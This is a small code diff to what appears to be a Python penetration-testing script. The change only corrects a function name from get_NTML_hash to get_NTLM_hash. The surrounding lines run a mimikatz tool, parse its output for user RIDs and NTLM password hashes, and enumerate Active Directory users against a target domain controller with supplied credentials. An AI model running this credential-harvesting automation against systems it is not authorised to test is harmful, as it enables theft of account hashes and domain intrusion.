@@ -45,7 +45,7 @@ def get_domain_name(filepath):
 # Read mimikatz output and find where there are RID and User lines, if there are both then there is a chance the following
 # Line will be an NTLM Hash, even without the NTLM hash, this still indicates what users are on the machine.
 
-def get_NTML_hash(filepath):
+def get_NTLM_hash(filepath):
     try:
         with open(filepath, 'r') as f, open('./output.txt', 'a') as of:
             of.write(f"Mimikatz output:\n")
@@ -243,7 +243,7 @@ mimiCommand = f"py {mimikatz_path} -f ./command.txt "\
 os.system(mimiCommand)
 
 # Extract key info to output text file.
-get_NTML_hash(".\\mimiOutput.txt")
+get_NTLM_hash(".\\mimiOutput.txt")
 
 # Run ADUsers script and filter the output
 ADUsersCommand = (f"py {getADUsers_path} -all -dc-ip {targetIP} {domain_name}/{username}:{password}"
